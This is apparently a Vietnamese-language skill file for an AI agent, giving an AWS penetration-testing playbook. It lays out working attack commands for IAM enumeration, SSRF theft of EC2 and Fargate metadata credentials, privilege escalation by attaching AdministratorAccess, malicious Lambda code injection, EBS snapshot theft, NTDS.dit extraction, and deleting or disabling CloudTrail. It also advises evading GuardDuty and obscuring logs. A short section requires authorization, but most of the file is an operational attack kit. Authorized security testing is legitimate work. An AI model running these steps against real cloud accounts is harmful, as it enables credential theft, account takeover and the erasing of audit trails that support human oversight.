---
name: AWS Penetration Testing
description: Kỹ năng này nên được sử dụng khi người dùng yêu cầu "pentest AWS", "kiểm tra bảo mật AWS", "liệt kê IAM", "khai thác hạ tầng đám mây", "leo thang đặc quyền AWS", "kiểm thử S3 bucket", "metadata SSRF", "khai thác Lambda", hoặc cần hướng dẫn đánh giá bảo mật Amazon Web Services.
metadata:
  author: zebbern
  version: "1.1"
---

# Kiểm thử Thâm nhập AWS (AWS Penetration Testing)

## Mục đích

Cung cấp các kỹ thuật toàn diện để kiểm thử thâm nhập môi trường đám mây AWS. Bao gồm liệt kê IAM, leo thang đặc quyền, SSRF đến metadata endpoint, khai thác S3 bucket, trích xuất mã Lambda và các kỹ thuật duy trì quyền truy cập cho các hoạt động red team.

## Đầu vào/Điều kiện tiên quyết

- AWS CLI đã được cấu hình với thông tin xác thực (credentials)
- Thông tin xác thực AWS hợp lệ (ngay cả khi có đặc quyền thấp)
- Hiểu biết về mô hình AWS IAM
- Python 3, thư viện boto3
- Các công cụ: Pacu, Prowler, ScoutSuite, SkyArk

## Đầu ra/Sản phẩm bàn giao

- Các đường dẫn leo thang đặc quyền IAM
- Các thông tin xác thực và bí mật (secrets) đã trích xuất
- Các tài nguyên EC2/Lambda/S3 bị xâm nhập
- Các cơ chế duy trì quyền truy cập (persistence)
- Các phát hiện kiểm toán bảo mật

---

## Các Công cụ Thiết yếu

| Công cụ          | Mục đích                | Cài đặt                                                    |
| ---------------- | ----------------------- | ---------------------------------------------------------- |
| Pacu             | Framework khai thác AWS | `git clone https://github.com/RhinoSecurityLabs/pacu`      |
| SkyArk           | Khám phá Shadow Admin   | `Import-Module .\SkyArk.ps1`                               |
| Prowler          | Kiểm toán bảo mật       | `pip install prowler`                                      |
| ScoutSuite       | Kiểm toán đa đám mây    | `pip install scoutsuite`                                   |
| enumerate-iam    | Liệt kê quyền hạn       | `git clone https://github.com/andresriancho/enumerate-iam` |
| Principal Mapper | Phân tích IAM           | `pip install principalmapper`                              |

---

## Quy trình Cốt lõi

### Bước 1: Liệt kê Ban đầu (Initial Enumeration)

Xác định danh tính bị xâm nhập và các quyền hạn:

```bash
# Kiểm tra danh tính hiện tại
aws sts get-caller-identity

# Cấu hình profile
aws configure --profile compromised

# Liệt kê các access keys
aws iam list-access-keys

# Liệt kê các quyền hạn
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
```

### Bước 2: Liệt kê IAM

```bash
# Liệt kê tất cả người dùng
aws iam list-users

# Liệt kê các nhóm cho người dùng
aws iam list-groups-for-user --user-name TARGET_USER

# Liệt kê các chính sách (policies) được đính kèm
aws iam list-attached-user-policies --user-name TARGET_USER

# Liệt kê các chính sách nội tuyến (inline policies)
aws iam list-user-policies --user-name TARGET_USER

# Lấy chi tiết chính sách
aws iam get-policy --policy-arn POLICY_ARN
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1

# Liệt kê các vai trò (roles)
aws iam list-roles
aws iam list-attached-role-policies --role-name ROLE_NAME
```

### Bước 3: Metadata SSRF (EC2)

Khai thác SSRF để truy cập metadata endpoint (IMDSv1):

```bash
# Truy cập metadata endpoint
http://169.254.169.254/latest/meta-data/

# Lấy tên vai trò IAM
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Trích xuất thông tin xác thực tạm thời
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Phản hồi chứa:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2019-08-01T05:20:30Z"
}
```

**Đối với IMDSv2 (yêu cầu token):**

```bash
# Lấy token trước
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")

# Sử dụng token cho các yêu cầu
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Thông tin xác thực Fargate Container:**

```bash
# Đọc biến môi trường để lấy đường dẫn credential
/proc/self/environ
# Tìm kiếm: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...

# Truy cập thông tin xác thực
http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
```

---

## Các Kỹ thuật Leo thang Đặc quyền

### Quyền Shadow Admin

Các quyền này tương đương với quản trị viên (administrator):

| Quyền                               | Khai thác                                |
| ----------------------------------- | ---------------------------------------- |
| `iam:CreateAccessKey`               | Tạo keys cho người dùng admin            |
| `iam:CreateLoginProfile`            | Đặt mật khẩu cho bất kỳ người dùng nào   |
| `iam:AttachUserPolicy`              | Đính kèm chính sách admin cho chính mình |
| `iam:PutUserPolicy`                 | Thêm chính sách admin nội tuyến          |
| `iam:AddUserToGroup`                | Thêm chính mình vào nhóm admin           |
| `iam:PassRole` + `ec2:RunInstances` | Khởi chạy EC2 với vai trò admin          |
| `lambda:UpdateFunctionCode`         | Tiêm mã vào Lambda                       |

### Tạo Access Key cho Người dùng Khác

```bash
aws iam create-access-key --user-name target_user
```

### Đính kèm Chính sách Admin

```bash
aws iam attach-user-policy --user-name my_username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Thêm Chính sách Admin Nội tuyến

```bash
aws iam put-user-policy --user-name my_username \
  --policy-name admin_policy \
  --policy-document file://admin-policy.json
```

### Leo thang Đặc quyền Lambda

```python
# code.py - Tiêm vào hàm Lambda
import boto3

def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

```bash
# Cập nhật mã Lambda
aws lambda update-function-code --function-name target_function \
  --zip-file fileb://malicious.zip
```

---

## Khai thác S3 Bucket

### Khám phá Bucket

```bash
# Sử dụng bucket_finder
./bucket_finder.rb wordlist.txt
./bucket_finder.rb --download --region us-east-1 wordlist.txt

# Các mẫu URL bucket phổ biến
https://{bucket-name}.s3.amazonaws.com
https://s3.amazonaws.com/{bucket-name}
```

### Liệt kê Bucket

```bash
# Liệt kê các buckets (với creds)
aws s3 ls

# Liệt kê nội dung bucket
aws s3 ls s3://bucket-name --recursive

# Tải xuống tất cả các tệp
aws s3 sync s3://bucket-name ./local-folder
```

### Tìm kiếm Bucket Công khai

```
https://buckets.grayhatwarfare.com/
```

---

## Khai thác Lambda

```bash
# Liệt kê các hàm Lambda
aws lambda list-functions

# Lấy mã hàm
aws lambda get-function --function-name FUNCTION_NAME
# Tải xuống từ URL được cung cấp trong phản hồi

# Gọi hàm
aws lambda invoke --function-name FUNCTION_NAME output.txt
```

---

## Thực thi Lệnh SSM

Systems Manager cho phép thực thi lệnh trên các instance EC2:

```bash
# Liệt kê các instance được quản lý
aws ssm describe-instance-information

# Thực thi lệnh
aws ssm send-command --instance-ids "i-0123456789" \
  --document-name "AWS-RunShellScript" \
  --parameters commands="whoami"

# Lấy đầu ra lệnh
aws ssm list-command-invocations --command-id "CMD-ID" \
  --details --query "CommandInvocations[].CommandPlugins[].Output"
```

---

## Khai thác EC2

### Gắn kết Ổ đĩa EBS (Mount EBS Volume)

```bash
# Tạo snapshot của ổ đĩa mục tiêu
aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"

# Tạo ổ đĩa từ snapshot
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a

# Gắn vào instance của kẻ tấn công
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf

# Gắn kết và truy cập
sudo mkdir /mnt/stolen
sudo mount /dev/xvdf1 /mnt/stolen
```

### Tấn công Shadow Copy (Windows DC)

```bash
# Kỹ thuật CloudCopy
# 1. Tạo snapshot của ổ đĩa DC
# 2. Chia sẻ snapshot với tài khoản kẻ tấn công
# 3. Gắn kết trong instance của kẻ tấn công
# 4. Trích xuất NTDS.dit và SYSTEM
secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
```

---

## Truy cập Console từ API Keys

Chuyển đổi thông tin xác thực CLI sang truy cập console:

```bash
git clone https://github.com/NetSPI/aws_consoler
aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY

# Tạo URL đăng nhập để truy cập console
```

---

## Xóa Dấu vết

### Vô hiệu hóa CloudTrail

```bash
# Xóa trail
aws cloudtrail delete-trail --name trail_name

# Vô hiệu hóa các sự kiện toàn cầu
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events

# Vô hiệu hóa vùng cụ thể
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events --no-is-multi-region-trail
```

**Lưu ý:** Kali/Parrot/Pentoo Linux kích hoạt cảnh báo GuardDuty dựa trên user-agent. Sử dụng Pacu để sửa đổi user-agent.

---

## Tham khảo Nhanh

| Tác vụ             | Lệnh                                            |
| ------------------ | ----------------------------------------------- |
| Lấy danh tính      | `aws sts get-caller-identity`                   |
| Liệt kê người dùng | `aws iam list-users`                            |
| Liệt kê vai trò    | `aws iam list-roles`                            |
| Liệt kê buckets    | `aws s3 ls`                                     |
| Liệt kê EC2        | `aws ec2 describe-instances`                    |
| Liệt kê Lambda     | `aws lambda list-functions`                     |
| Lấy metadata       | `curl http://169.254.169.254/latest/meta-data/` |

---

## Các Hạn chế

**Phải:**

- Có văn bản ủy quyền trước khi kiểm thử
- Ghi lại tất cả các hành động cho dấu vết kiểm toán
- Chỉ kiểm thử các tài nguyên trong phạm vi

**Không được:**

- Sửa đổi dữ liệu sản xuất mà không được phê duyệt
- Để lại backdoors dai dẳng mà không có tài liệu
- Vô hiệu hóa vĩnh viễn các kiểm soát bảo mật

**Nên:**

- Kiểm tra IMDSv2 trước khi thử các cuộc tấn công metadata
- Liệt kê kỹ lưỡng trước khi khai thác
- Dọn dẹp các tài nguyên kiểm thử sau khi hoàn thành

---

## Ví dụ

### Ví dụ 1: SSRF đến Admin

```bash
# 1. Tìm lỗ hổng SSRF trong ứng dụng web
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Lấy tên vai trò từ phản hồi
# 3. Trích xuất thông tin xác thực
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# 4. Cấu hình AWS CLI với creds bị đánh cắp
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 5. Xác minh quyền truy cập
aws sts get-caller-identity
```

---

## Khắc phục sự cố

| Vấn đề                                   | Giải pháp                                  |
| ---------------------------------------- | ------------------------------------------ |
| Truy cập bị từ chối trên tất cả các lệnh | Liệt kê quyền hạn với enumerate-iam        |
| Metadata endpoint bị chặn                | Kiểm tra IMDSv2, thử container metadata    |
| Cảnh báo GuardDuty                       | Sử dụng Pacu với user-agent tùy chỉnh      |
| Thông tin xác thực hết hạn               | Lấy lại từ metadata (temp creds xoay vòng) |
| CloudTrail ghi log hành động             | Cân nhắc vô hiệu hóa hoặc làm mờ log       |

---

## Tài nguyên Bổ sung

Đối với các kỹ thuật nâng cao bao gồm khai thác Lambda/API Gateway, Secrets Manager & KMS, bảo mật Container (ECS/EKS/ECR), khai thác RDS/DynamoDB, di chuyển ngang VPC và danh sách kiểm tra bảo mật, xem `references/advanced-aws-pentesting_vi.md`.
